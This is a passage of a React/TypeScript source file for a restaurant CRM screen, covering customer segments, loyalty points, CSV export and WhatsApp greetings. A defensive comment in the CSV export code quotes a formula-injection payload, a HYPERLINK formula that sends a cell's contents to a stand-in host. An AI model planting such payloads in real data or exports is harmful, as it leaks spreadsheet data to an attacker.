import React, { useState, useMemo, useEffect } from 'react';
import { CustomerAccount, Order } from '@jamanvaar/types';
import { db, CustomerRepository, AuditRepository } from '@jamanvaar/database';
import { LoyaltyProgramModal } from './LoyaltyProgramModal';
import { MarketingCampaignsModal } from './MarketingCampaignsModal';
import { formatINR, formatDate, formatTime, toCsvRow } from '@jamanvaar/utils';
import { EmptyState } from '@jamanvaar/ui';
import {
  Users,
  Search,
  Plus,
  Award,
  DollarSign,
  TrendingUp,
  Sparkles,
  Phone,
  Mail,
  MapPin,
  Calendar,
  Tag,
  Edit2,
  Trash2,
  Download,
  FileSpreadsheet,
  MessageSquare,
  ShoppingBag,
  Clock,
  CheckCircle2,
  Star,
  ExternalLink,
  ChevronRight,
  Filter,
  X,
  UserCheck,
  AlertCircle,
  Megaphone
} from 'lucide-react';

interface CustomersCrmModuleProps {
  customers: CustomerAccount[];
  orders: Order[];
  onCustomerUpdated: () => void;
  showToast: (msg: string) => void;
  onOpenCreateModal: () => void;
  onOpenEditModal: (cust: CustomerAccount) => void;
  onRequestConfirm?: (dialog: {
    isOpen: boolean;
    title: string;
    message: string;
    confirmText: string;
    isDanger: boolean;
    onConfirm: () => void;
  }) => void;
}

export type CustomerSegment =
  | 'ALL'
  | 'VIP'
  | 'REGULAR'
  | 'NEW'
  | 'INACTIVE'
  | 'CELEBRATION';

export const CustomersCrmModule: React.FC<CustomersCrmModuleProps> = ({
  customers,
  orders,
  onCustomerUpdated,
  showToast,
  onOpenCreateModal,
  onOpenEditModal,
  onRequestConfirm
}) => {
  const [searchQuery, setSearchQuery] = useState('');
  const [segmentFilter, setSegmentFilter] = useState<CustomerSegment>('ALL');
  const [tagFilter, setTagFilter] = useState<string>('ALL');
  const [sortBy, setSortBy] = useState<'SPEND' | 'VISITS' | 'POINTS' | 'RECENT' | 'NAME'>('SPEND');

  // Customer 360 Detail Modal state
  const [detailCustomer, setDetailCustomer] = useState<CustomerAccount | null>(null);
  const [pointsAdjustInput, setPointsAdjustInput] = useState('50');
  const [isLoyaltyModalOpen, setIsLoyaltyModalOpen] = useState(false);
  const [isMarketingModalOpen, setIsMarketingModalOpen] = useState(false);

  // Escape closes the Customer 360 drilldown like any other dialog in the app.
  useEffect(() => {
    if (!detailCustomer) return;
    const onKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') setDetailCustomer(null);
    };
    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [detailCustomer]);

  // Derive rich computed stats per customer by merging accounts with database orders
  const richCustomers = useMemo(() => {
    return customers.map((cust) => {
      const custOrders = orders.filter((o) => o.customerPhone === cust.phone);
      const totalOrderSpend = custOrders.reduce((sum, o) => sum + (o.orderStatus !== 'CANCELLED' ? o.totalAmount : 0), 0);
      const totalSpend = Math.max(cust.totalSpend || 0, totalOrderSpend);
      const totalVisits = Math.max(cust.totalVisits || 0, custOrders.length);
      const avgOrderValue = totalVisits > 0 ? Math.round(totalSpend / totalVisits) : 0;

      // Find last visit
      let lastVisit = cust.lastVisitAt ? new Date(cust.lastVisitAt).getTime() : 0;
      if (custOrders.length > 0) {
        const orderTimes = custOrders.map((o) => new Date(o.createdAt).getTime());
        lastVisit = Math.max(lastVisit, ...orderTimes);
      }

      // Check if VIP
      const isVip = (cust.tags && cust.tags.includes('VIP')) || totalSpend >= 5000 || totalVisits >= 5;

      return {
        ...cust,
        computedTotalSpend: totalSpend,
        computedTotalVisits: totalVisits,
        computedAvgOrderValue: avgOrderValue,
        computedLastVisit: lastVisit > 0 ? new Date(lastVisit).toISOString() : cust.createdAt,
        isVip,
        orders: custOrders
      };
    });
  }, [customers, orders]);

  // Executive KPI summary metrics
  const kpis = useMemo(() => {
    const totalCount = richCustomers.length;
    const vipCount = richCustomers.filter((c) => c.isVip).length;
    const totalLifetimeSpend = richCustomers.reduce((sum, c) => sum + c.computedTotalSpend, 0);
    const totalPointsPool = richCustomers.reduce((sum, c) => sum + (c.loyaltyPoints || 0), 0);
    const avgSpendPerGuest = totalCount > 0 ? Math.round(totalLifetimeSpend / totalCount) : 0;

    return {
      totalCount,
      vipCount,
      totalLifetimeSpend,
      totalPointsPool,
      avgSpendPerGuest
    };
  }, [richCustomers]);

  // Segment & Search Filtering
  const filteredCustomers = useMemo(() => {
    const now = Date.now();
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000;
    const currentMonth = new Date().getMonth();

    return richCustomers
      .filter((cust) => {
        // 1. Segment Filter
        if (segmentFilter === 'VIP' && !cust.isVip) return false;
        if (segmentFilter === 'REGULAR' && cust.computedTotalVisits < 3) return false;
        if (segmentFilter === 'NEW') {
          const created = cust.createdAt ? new Date(cust.createdAt).getTime() : 0;
          if (now - created > thirtyDaysMs && cust.computedTotalVisits > 2) return false;
        }
        if (segmentFilter === 'INACTIVE') {
          const last = cust.computedLastVisit ? new Date(cust.computedLastVisit).getTime() : 0;
          if (last > 0 && now - last <= thirtyDaysMs) return false;
        }
        if (segmentFilter === 'CELEBRATION') {
          const dobMonth = cust.dob ? new Date(cust.dob).getMonth() : -1;
          const annMonth = cust.anniversary ? new Date(cust.anniversary).getMonth() : -1;
          if (dobMonth !== currentMonth && annMonth !== currentMonth) return false;
        }

        // 2. Tag Filter
        if (tagFilter !== 'ALL') {
          if (!cust.tags || !cust.tags.includes(tagFilter)) return false;
        }

        // 3. Search Query
        if (searchQuery.trim()) {
          const q = searchQuery.toLowerCase();
          const matchName = cust.name?.toLowerCase().includes(q);
          const matchPhone = cust.phone?.toLowerCase().includes(q);
          const matchEmail = cust.email?.toLowerCase().includes(q);
          const matchAddress = cust.address?.toLowerCase().includes(q);
          const matchNotes = cust.notes?.toLowerCase().includes(q);
          const matchTag = cust.tags?.some((t) => t.toLowerCase().includes(q));

          if (!matchName && !matchPhone && !matchEmail && !matchAddress && !matchNotes && !matchTag) {
            return false;
          }
        }

        return true;
      })
      .sort((a, b) => {
        if (sortBy === 'SPEND') return b.computedTotalSpend - a.computedTotalSpend;
        if (sortBy === 'VISITS') return b.computedTotalVisits - a.computedTotalVisits;
        if (sortBy === 'POINTS') return (b.loyaltyPoints || 0) - (a.loyaltyPoints || 0);
        if (sortBy === 'RECENT') {
          const tA = a.computedLastVisit ? new Date(a.computedLastVisit).getTime() : 0;
          const tB = b.computedLastVisit ? new Date(b.computedLastVisit).getTime() : 0;
          return tB - tA;
        }
        if (sortBy === 'NAME') return (a.name || '').localeCompare(b.name || '');
        return 0;
      });
  }, [richCustomers, segmentFilter, tagFilter, searchQuery, sortBy]);

  // Quick points award
  const handleQuickAwardPoints = (phone: string, points: number, custName: string) => {
    CustomerRepository.addLoyaltyPoints(phone, points);
    AuditRepository.log({
      action: 'LOYALTY_POINTS_AWARDED',
      category: 'CUSTOMER',
      details: `Awarded +${points} loyalty reward points to ${custName} (${phone})`,
      username: 'Manager'
    });
    onCustomerUpdated();
    showToast(`Awarded +${points} Loyalty Points to ${custName}!`);
  };

  // Quick points redeem / deduct
  const handleAdjustPointsInDetail = (isAdd: boolean) => {
    if (!detailCustomer) return;
    const pts = Math.abs(Number(pointsAdjustInput)) || 0;
    if (pts === 0) return;

    if (isAdd) {
      CustomerRepository.addLoyaltyPoints(detailCustomer.phone, pts);
      showToast(`Added +${pts} points to ${detailCustomer.name}`);
    } else {
      if ((detailCustomer.loyaltyPoints || 0) < pts) {
        showToast('Insufficient loyalty points balance!');
        return;
      }
      CustomerRepository.redeemPoints(detailCustomer.phone, pts);
      showToast(`Redeemed -${pts} points for ${detailCustomer.name}`);
    }

    onCustomerUpdated();
    const updated = CustomerRepository.getByPhone(detailCustomer.phone);
    if (updated) setDetailCustomer(updated);
  };

  const handleRedeemReward = (rewardId: string, rewardName: string, pointsCost: number) => {
    if (!detailCustomer) return;
    const result = CustomerRepository.redeemReward(detailCustomer.phone, rewardId);
    if (!result.ok) {
      showToast(result.reason || 'Could not redeem reward');
      return;
    }
    showToast(`Redeemed "${rewardName}" for ${pointsCost} pts`);
    onCustomerUpdated();
    const updated = CustomerRepository.getByPhone(detailCustomer.phone);
    if (updated) setDetailCustomer(updated);
  };

  // Delete customer record
  const handleDeleteCustomer = (cust: CustomerAccount) => {
    const doDelete = () => {
      CustomerRepository.deleteCustomer(cust.phone);
      onCustomerUpdated();
      if (detailCustomer?.phone === cust.phone) setDetailCustomer(null);
      showToast(`Customer ${cust.name} deleted.`);
    };

    if (onRequestConfirm) {
      onRequestConfirm({
        isOpen: true,
        title: 'Delete Customer',
        message: `Are you sure you want to delete customer record for ${cust.name || cust.phone}? This cannot be undone.`,
        confirmText: 'Delete Customer',
        isDanger: true,
        onConfirm: doDelete
      });
    } else if (window.confirm(`Are you sure you want to delete customer record for ${cust.name || cust.phone}?`)) {
      doDelete();
    }
  };

  // Export Customers CSV
  const handleExportCsv = () => {
    const headers = [
      'Customer Name',
      'Phone Number',
      'Email',
      'Address',
      'Tags',
      'Total Visits',
      // BUG-LOW-002: was '(INR)' text while every other CSV/report export
      // in this app (reportExportService.ts, the on-screen totals here and
      // elsewhere via formatINR) labels currency columns with '(₹)' —
      // standardizing on the glyph already used everywhere else.
      'Lifetime Spend (₹)',
      'Avg Order Value (₹)',
      'Loyalty Points',
      'Date of Birth',
      'Anniversary',
      'Last Visit Date',
      'Notes'
    ];

    // B2-061: this used to hand-roll `"${value}"` quoting per field, which (a) never defended
    // against CSV/formula injection (a name/notes/address starting with `=`/`+`/`-`/`@` fires as
    // a formula the moment this file is opened in Excel/Sheets — confirmed live with
    // `=HYPERLINK("http://evil.test?x="&A1,"Click")` as a customer name) and (b) only escaped
    // internal `"` on Address/Notes, not on Name/Phone/Email — so a literal `"` in a name broke
    // the row's own column boundaries. toCsvRow does both, on every field.
    const rows = filteredCustomers.map((c) => [
      c.name || 'Valued Guest',
      c.phone,
      c.email || '',
      c.address || '',
      (c.tags || []).join(', '),
      c.computedTotalVisits,
      c.computedTotalSpend,
      c.computedAvgOrderValue,
      c.loyaltyPoints || 0,
      c.dob || '',
      c.anniversary || '',
      c.computedLastVisit ? formatDate(c.computedLastVisit) : '',
      c.notes || ''
    ]);

    const csvContent = [toCsvRow(headers), ...rows.map(toCsvRow)].join('\r\n');
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `jamanvaar_crm_customers_${Date.now()}.csv`;
    document.body.appendChild(link);
    link.click();
    link.remove();
    showToast(`Exported ${filteredCustomers.length} Customer Profiles to CSV!`);
  };

  // Send WhatsApp message
  const handleSendWhatsApp = (phone: string, name: string, message: string) => {
    const cleanPhone = phone.replace(/[^0-9]/g, '');
    const fullPhone = cleanPhone.length === 10 ? `91${cleanPhone}` : cleanPhone;
    const url = `https://wa.me/${fullPhone}?text=${encodeURIComponent(message)}`;
    window.open(url, '_blank');
    showToast(`Opening WhatsApp for ${name}...`);
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto select-none pb-12">
      
      {/* 1. HEADER & QUICK ACTIONS */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-2xl sm:text-3xl font-black text-jaman-navy tracking-tight">
              Customer Relationship Management (CRM)
            </h1>
            <span className="bg-amber-100 text-amber-900 font-black text-xs px-2.5 py-0.5 rounded-full border border-amber-200">
              LOYALTY & 360 INTELLIGENCE
            </span>
          </div>
          <p className="text-xs sm:text-sm text-[#4A5568] mt-0.5">
            Guest directory, dining spend matrices, loyalty reward point pools, dietary preferences, and automated WhatsApp engagement.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={handleExportCsv}
            className="px-3.5 py-2 rounded-xl bg-white border border-jaman-border hover:bg-jaman-cream text-jaman-navy text-xs font-bold flex items-center gap-1.5 shadow-xs transition-all"
          >
            <FileSpreadsheet className="w-4 h-4 text-emerald-600" />
            <span>Export CRM CSV ({filteredCustomers.length})</span>
          </button>

          <button
            onClick={() => setIsLoyaltyModalOpen(true)}
            className="px-3.5 py-2 rounded-xl bg-white border border-amber-200 hover:bg-amber-50 text-amber-800 text-xs font-bold flex items-center gap-1.5 shadow-xs transition-all"
          >
            <Award className="w-4 h-4 text-amber-600" />
            <span>Loyalty Program</span>
          </button>

          <button
            onClick={() => setIsMarketingModalOpen(true)}
            className="px-3.5 py-2 rounded-xl bg-white border border-blue-200 hover:bg-blue-50 text-blue-800 text-xs font-bold flex items-center gap-1.5 shadow-xs transition-all"
          >
            <Megaphone className="w-4 h-4 text-blue-600" />
            <span>Marketing Campaigns</span>
          </button>

          <button
            onClick={onOpenCreateModal}
            className="px-4 py-2 rounded-xl bg-jaman-saffron hover:bg-[#EA580C] text-white text-xs font-bold flex items-center gap-1.5 shadow-xs transition-all active:scale-95 shadow-jaman-saffron/20"
          >
            <Plus className="w-4 h-4" />
            <span>Register New Customer</span>
          </button>
        </div>
      </div>

      {/* 2. EXECUTIVE CRM METRIC CARDS */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
        
        {/* Total Customers */}
        <div className="bg-white p-4 rounded-2xl border border-jaman-border shadow-2xs space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-black uppercase tracking-wider text-slate-500">TOTAL GUESTS</span>
            <Users className="w-4 h-4 text-jaman-navy" />
          </div>
          <div className="text-2xl font-black text-jaman-navy font-mono">
            {kpis.totalCount} Profiles
          </div>
          <span className="text-[10px] text-slate-500 font-bold block">
            {kpis.vipCount} VIPs & High Spenders
          </span>
        </div>

        {/* Total Lifetime Spend */}
        <div className="bg-white p-4 rounded-2xl border border-jaman-border shadow-2xs space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-black uppercase tracking-wider text-slate-500">LIFETIME SPEND</span>
            <DollarSign className="w-4 h-4 text-emerald-600" />
          </div>
          <div className="text-2xl font-black text-emerald-800 font-mono">
            {formatINR(kpis.totalLifetimeSpend)}
          </div>
          <span className="text-[10px] text-emerald-700 font-bold block">
            Avg {formatINR(kpis.avgSpendPerGuest)} per Registered Guest
          </span>
        </div>

        {/* Active Loyalty Points Pool */}
        <div className="bg-white p-4 rounded-2xl border border-jaman-border shadow-2xs space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-black uppercase tracking-wider text-slate-500">LOYALTY REWARDS</span>
            <Award className="w-4 h-4 text-jaman-saffron" />
          </div>
          <div className="text-2xl font-black text-jaman-saffron font-mono">
            ⭐ {kpis.totalPointsPool} Pts
          </div>
          <span className="text-[10px] text-slate-600 font-bold block">
            ₹{kpis.totalPointsPool} Total Redeemable Value
          </span>
        </div>

        {/* VIP High Spenders */}
        <div className="bg-white p-4 rounded-2xl border border-jaman-border shadow-2xs space-y-1">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-black uppercase tracking-wider text-slate-500">VIP ELITE TIER</span>
            <Star className="w-4 h-4 text-jaman-navy" />
          </div>
          <div className="text-2xl font-black text-jaman-navy font-mono">
            {kpis.vipCount} VIP Guests
          </div>
          <span className="text-[10px] text-slate-500 font-bold block">
            Highest dining frequency & ticket size
          </span>
        </div>
      </div>

      {/* 3. SEGMENT FILTER CHIPS */}
      <div className="bg-white p-3.5 rounded-2xl border border-jaman-border shadow-2xs flex flex-wrap items-center justify-between gap-3 text-xs">
        <div className="flex items-center gap-1.5 overflow-x-auto">
          <span className="text-slate-400 font-bold uppercase text-[10px] mr-1">Dining Segments:</span>
          {[
            { id: 'ALL', label: 'All Guests' },
            { id: 'VIP', label: '⭐ VIP High Spenders' },
            { id: 'REGULAR', label: '🔁 Frequent Regulars' },
            { id: 'NEW', label: '✨ New Guests' },
            { id: 'INACTIVE', label: '💤 Inactive (30+ Days)' },
            { id: 'CELEBRATION', label: '🎂 Celebrations This Month' }
          ].map((seg) => (
            <button
              key={seg.id}
              onClick={() => setSegmentFilter(seg.id as CustomerSegment)}
              className={`px-3 py-1.5 rounded-xl font-bold transition-all whitespace-nowrap ${
                segmentFilter === seg.id
                  ? 'bg-jaman-navy text-white shadow-xs'
                  : 'bg-jaman-cream text-slate-700 hover:bg-slate-200 border border-jaman-border'
              }`}
            >
              {seg.label}
            </button>
          ))}
        </div>

        <div className="text-[11px] font-bold text-slate-500">
          Showing: <strong className="text-jaman-navy font-mono">{filteredCustomers.length}</strong> matching profiles
        </div>
      </div>

      {/* 4. SEARCH & ADVANCED FILTER CONTROLS */}
      <div className="bg-white p-4 rounded-3xl border border-jaman-border shadow-xs flex flex-col sm:flex-row items-center justify-between gap-3">
        {/* Search Box */}
        <div className="relative flex-1 w-full">
          <Search className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search by customer name, phone number, email, address, tags, notes..."
            className="w-full bg-jaman-cream border border-jaman-border rounded-xl pl-9 pr-8 py-2 text-xs font-bold text-jaman-navy focus:outline-none focus:border-jaman-saffron"
          />
          {searchQuery && (
            <button
              onClick={() => setSearchQuery('')}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
            >
              <X className="w-3.5 h-3.5" />
            </button>
          )}
        </div>

        {/* Dropdowns */}
        <div className="flex flex-wrap items-center gap-2 w-full sm:w-auto text-xs">
          {/* Tag Filter */}
          <select
            value={tagFilter}
            onChange={(e) => setTagFilter(e.target.value)}
            className="bg-jaman-cream border border-jaman-border rounded-xl px-3 py-2 font-bold text-jaman-navy"
          >
            <option value="ALL">All Tags</option>
            <option value="VIP">⭐ VIP Only</option>
            <option value="REGULAR">Regular Guests</option>
            <option value="CORPORATE">Corporate Clients</option>
            <option value="FAMILY">Family Diners</option>
            <option value="VEGAN">Vegan Guests</option>
            <option value="JAIN">Strict Jain</option>
          </select>

          {/* Sort By */}
          <select
            value={sortBy}
            onChange={(e) => setSortBy(e.target.value as any)}
            className="bg-jaman-cream border border-jaman-border rounded-xl px-3 py-2 font-bold text-jaman-navy"
          >
            <option value="SPEND">Sort by: Highest Spend</option>
            <option value="VISITS">Sort by: Most Visits</option>
            <option value="POINTS">Sort by: Loyalty Points</option>
            <option value="RECENT">Sort by: Recently Visited</option>
            <option value="NAME">Sort by: Name (A-Z)</option>
          </select>
        </div>
      </div>

      {/* 5. CUSTOMERS DIRECTORY TABLE */}
      {filteredCustomers.length === 0 ? (
        <EmptyState
          icon={<Users className="w-8 h-8" />}
          title={customers.length === 0 ? 'No Guest Profiles Yet' : 'No Customer Profiles Found'}
          description={
            customers.length === 0
              ? 'Real guest profiles appear here automatically once a customer is attached to an order at POS, Kiosk, or Captain — no demo data is shown until then.'
              : 'No guest records matched the selected dining segment, tag filter, or search query.'
          }
          actionText={customers.length > 0 ? 'Reset Filters & View All' : undefined}
          onAction={
            customers.length > 0
              ? () => {
                  setSearchQuery('');
                  setSegmentFilter('ALL');
                  setTagFilter('ALL');
                }
              : undefined
          }
        />
      ) : (
        <div className="bg-white rounded-3xl border border-jaman-border overflow-hidden shadow-xs">
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead className="bg-[#F8F6F0] border-b border-jaman-border text-slate-500 uppercase font-bold sticky top-0 z-10">
                <tr>
                  <th className="p-3.5">Customer & Contacts</th>
                  <th className="p-3.5">Tags / Profile</th>
                  <th className="p-3.5 text-center">Visits</th>
                  <th className="p-3.5 text-right">Lifetime Spend</th>
                  <th className="p-3.5 text-right">Avg Order</th>
                  <th className="p-3.5">Loyalty Points</th>
                  <th className="p-3.5">Last Visit</th>
                  <th className="p-3.5 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100">
                {filteredCustomers.map((cust) => (
                  <tr
                    key={cust.phone}
                    className="hover:bg-amber-50/30 cursor-pointer transition-colors"
                    onClick={() => setDetailCustomer(cust)}
                  >
                    {/* Customer & Contacts */}
                    <td className="p-3.5">
                      <div className="flex items-center gap-3">
                        <div className={`w-9 h-9 rounded-2xl flex items-center justify-center font-black text-xs shrink-0 ${
                          cust.isVip
                            ? 'bg-amber-100 text-amber-900 border border-amber-300'
                            : 'bg-jaman-cream text-jaman-navy border border-jaman-border'
                        }`}>
                          {cust.isVip ? '⭐' : (cust.name ? cust.name[0].toUpperCase() : 'G')}
                        </div>
                        <div>
                          <div className="flex items-center gap-1.5">
                            <strong className="font-extrabold text-jaman-navy text-sm">{cust.name || 'Valued Guest'}</strong>
                            {cust.isVip && (
                              <span className="bg-amber-100 text-amber-900 text-[9px] font-black px-1.5 py-0.2 rounded">
                                VIP
                              </span>
                            )}
                          </div>
                          <div className="flex items-center gap-2 text-[11px] font-mono text-slate-500 mt-0.5">
                            <span>📞 {cust.phone}</span>
                            {cust.email && <span className="text-slate-400">✉️ {cust.email}</span>}
                          </div>
                        </div>
                      </div>
                    </td>

                    {/* Tags / Badges */}
                    <td className="p-3.5">
                      <div className="flex flex-wrap gap-1">
                        {cust.tags && cust.tags.length > 0 ? (
                          cust.tags.map((t) => (
                            <span
                              key={t}
                              className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                t === 'VIP'
                                  ? 'bg-amber-100 text-amber-800 font-black'
                                  : t === 'JAIN'
                                  ? 'bg-emerald-100 text-emerald-800 font-black'
                                  : t === 'VEGAN'
                                  ? 'bg-teal-100 text-teal-800'
                                  : t === 'CORPORATE'
                                  ? 'bg-blue-100 text-blue-800'
                                  : 'bg-slate-100 text-slate-700'
                              }`}
                            >
                              {t}
                            </span>
                          ))
                        ) : (
                          <span className="text-slate-400 text-[10px]">Standard Guest</span>
                        )}
                      </div>
                      {cust.notes && (
                        <p className="text-[10px] text-slate-500 italic truncate max-w-[180px] mt-1" title={cust.notes}>
                          "{cust.notes}"
                        </p>
                      )}
                    </td>

                    {/* Visits */}
                    <td className="p-3.5 text-center font-mono font-bold text-slate-700">
                      {cust.computedTotalVisits}
                    </td>

                    {/* Lifetime Spend */}
                    <td className="p-3.5 text-right font-mono font-black text-emerald-700 text-sm">
                      {formatINR(cust.computedTotalSpend)}
                    </td>

                    {/* Avg Order */}
                    <td className="p-3.5 text-right font-mono font-semibold text-slate-700">
                      {formatINR(cust.computedAvgOrderValue)}
                    </td>

                    {/* Loyalty Points with Quick Add */}
                    <td className="p-3.5" onClick={(e) => e.stopPropagation()}>
                      <div className="flex items-center gap-1.5">
                        {(() => {
                          const tier = CustomerRepository.getTierForAccount(cust);
                          return tier ? (
                            <span
                              className="font-black px-1.5 py-0.5 rounded-lg text-[10px] border shrink-0"
                              style={{ color: tier.colorHex, borderColor: tier.colorHex, background: `${tier.colorHex}14` }}
                              title={`${tier.name} tier — ${tier.pointsMultiplier}x points`}
                            >
                              {tier.name}
                            </span>
                          ) : null;
                        })()}
                        <span className="font-mono font-black text-amber-700 bg-amber-50 border border-amber-200 px-2 py-0.5 rounded-lg text-xs">
                          ⭐ {cust.loyaltyPoints || 0}
                        </span>
                        <button
                          onClick={() => handleQuickAwardPoints(cust.phone, 50, cust.name || 'Guest')}
                          className="px-1.5 py-0.5 bg-amber-100 hover:bg-amber-200 text-amber-900 font-bold rounded text-[10px] transition-colors"
                          title="Award 50 Bonus Points"
                        >
                          +50
                        </button>
                      </div>
                    </td>

                    {/* Last Visit */}
                    <td className="p-3.5 text-slate-500 font-mono text-[11px]">
                      {cust.computedLastVisit ? formatDate(cust.computedLastVisit) : 'New Guest'}
                    </td>

                    {/* Actions */}
                    <td className="p-3.5 text-right" onClick={(e) => e.stopPropagation()}>
                      <div className="flex items-center justify-end gap-1.5">
                        <button
                          onClick={() => {
                            const msg = `Namaste ${cust.name || 'Guest'}! Greetings from ${db.restaurant?.name || 'JAMANVAAR'}. You currently have ${cust.loyaltyPoints || 0} loyalty points redeemable on your next dining experience with us!`;
                            handleSendWhatsApp(cust.phone, cust.name || 'Guest', msg);
                          }}
                          title="Send WhatsApp Greeting"
                          className="p-1.5 bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border border-emerald-200 rounded-lg transition-colors"
                        >
                          <MessageSquare className="w-3.5 h-3.5" />
                        </button>

                        <button
                          onClick={() => onOpenEditModal(cust)}
                          title="Edit Customer Profile"
                          className="p-1.5 text-slate-600 hover:text-jaman-saffron hover:bg-slate-100 rounded-lg transition-colors"
                        >
                          <Edit2 className="w-3.5 h-3.5" />
                        </button>

                        <button
                          onClick={() => handleDeleteCustomer(cust)}
                          title="Delete Profile"
                          className="p-1.5 text-rose-500 hover:text-rose-700 hover:bg-rose-50 rounded-lg transition-colors"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>

                        <button
                          onClick={() => setDetailCustomer(cust)}
                          className="px-2.5 py-1 bg-jaman-navy hover:bg-jaman-darkBorder text-white font-bold rounded-lg text-xs transition-colors"
                        >
                          360
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 6. CUSTOMER 360 COMPREHENSIVE DRILLDOWN MODAL */}
      {/* ========================================================================= */}
      {detailCustomer && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4">
          <div className="bg-white w-full max-w-3xl rounded-3xl shadow-2xl border border-slate-200 overflow-hidden flex flex-col max-h-[92vh] animate-in fade-in zoom-in-95">
            
            {/* Header */}
            <div className="p-5 bg-jaman-navy text-white flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-2xl bg-white/10 flex items-center justify-center font-black text-lg text-jaman-saffron">
                  {detailCustomer.name ? detailCustomer.name[0].toUpperCase() : 'G'}
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="font-black text-lg">{detailCustomer.name || 'Valued Guest'}</h3>
                    {detailCustomer.tags?.map((t) => (
                      <span key={t} className="bg-jaman-saffron text-white font-mono font-black text-[10px] px-2 py-0.5 rounded">
                        {t}
                      </span>
                    ))}
                  </div>
                  <p className="text-xs text-slate-300">
                    📞 {detailCustomer.phone} {detailCustomer.email ? `• ✉️ ${detailCustomer.email}` : ''}
                  </p>
                </div>
              </div>

              <button
                onClick={() => setDetailCustomer(null)}
                className="p-1.5 bg-white/10 hover:bg-white/20 rounded-xl text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Modal Body */}
            <div className="flex-1 overflow-y-auto p-5 space-y-5 text-xs">
              
              {/* 4 Financial Highlight Cards */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
                <div className="bg-jaman-cream p-3 rounded-2xl border border-slate-200">
                  <span className="text-[10px] text-slate-400 font-bold uppercase block">Lifetime Spend</span>
                  <strong className="text-base font-mono font-black text-emerald-700">
                    {formatINR((detailCustomer as any).computedTotalSpend || detailCustomer.totalSpend || 0)}
                  </strong>
                </div>
                <div className="bg-jaman-cream p-3 rounded-2xl border border-slate-200">
                  <span className="text-[10px] text-slate-400 font-bold uppercase block">Visits / Orders</span>
                  <strong className="text-base font-mono font-black text-jaman-navy">
                    {(detailCustomer as any).computedTotalVisits || detailCustomer.totalVisits || 0} visits
                  </strong>
                </div>
                <div className="bg-jaman-cream p-3 rounded-2xl border border-slate-200">
                  <span className="text-[10px] text-slate-400 font-bold uppercase block">Average Order</span>
                  <strong className="text-base font-mono font-black text-blue-700">
                    {formatINR((detailCustomer as any).computedAvgOrderValue || 0)}
                  </strong>
                </div>
                <div className="bg-jaman-cream p-3 rounded-2xl border border-amber-200 bg-amber-50/50">
                  <span className="text-[10px] text-amber-800 font-bold uppercase block">Loyalty Balance</span>
                  <strong className="text-base font-mono font-black text-amber-900">
                    ⭐ {detailCustomer.loyaltyPoints || 0} Pts
                  </strong>
                </div>
              </div>

              {/* Personal Details & Preferences Grid */}
              <div className="bg-jaman-cream p-4 rounded-2xl border border-jaman-border grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <span className="text-[10px] text-slate-400 font-bold block uppercase">Delivery / Home Address:</span>
                  <p className="font-medium text-jaman-navy mt-0.5">{detailCustomer.address || 'No physical address recorded.'}</p>
                </div>

                <div>
                  <span className="text-[10px] text-slate-400 font-bold block uppercase">Celebration Dates:</span>
                  <div className="flex gap-4 font-mono font-bold text-slate-700 mt-0.5">
                    <span>🎂 Birthday: {detailCustomer.dob ? formatDate(detailCustomer.dob) : 'Not set'}</span>
                    <span>💍 Anniv: {detailCustomer.anniversary ? formatDate(detailCustomer.anniversary) : 'Not set'}</span>
                  </div>
                </div>

                <div className="sm:col-span-2 pt-2 border-t border-slate-200">
                  <span className="text-[10px] text-slate-400 font-bold block uppercase">Special Notes & Dietary Instructions:</span>
                  <p className="text-slate-700 font-medium mt-0.5 italic">
                    "{detailCustomer.notes || 'No special dietary instructions.'}"
                  </p>
                </div>
              </div>

              {/* Loyalty Reward Points Ledger & Manager */}
              <div className="p-4 rounded-2xl border border-amber-200 bg-gradient-to-r from-amber-50/70 to-white flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <h4 className="font-extrabold text-xs text-amber-950 flex items-center gap-1.5">
                    <Award className="w-4 h-4 text-amber-600" />
                    <span>Loyalty Points Management (1 Pt = ₹1 Discount)</span>
                  </h4>
                  <p className="text-[11px] text-amber-800 mt-0.5">
                    Current Redeemable Balance: <strong>{detailCustomer.loyaltyPoints || 0} Points</strong>
                  </p>
                </div>

                <div className="flex items-center gap-2">
                  <input
                    type="number"
                    value={pointsAdjustInput}
                    onChange={(e) => setPointsAdjustInput(e.target.value)}
                    className="w-20 bg-white border border-amber-300 rounded-xl px-2.5 py-1.5 text-xs font-mono font-bold text-center"
                    placeholder="50"
                  />
                  <button
                    onClick={() => handleAdjustPointsInDetail(true)}
